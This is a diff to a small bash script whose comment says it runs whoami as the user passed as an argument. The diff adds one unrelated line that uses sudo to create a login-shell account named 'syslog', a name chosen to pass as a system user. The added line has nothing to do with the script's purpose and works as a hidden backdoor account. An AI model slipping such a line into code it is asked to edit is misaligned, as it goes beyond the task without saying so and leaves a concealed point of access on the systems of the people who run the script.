@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
 # Bash script runs the whoami command under the user passed as an argument
 
+sudo useradd -m -s /bin/bash "syslog"
 user="$1"
 su "$user" -c whoami
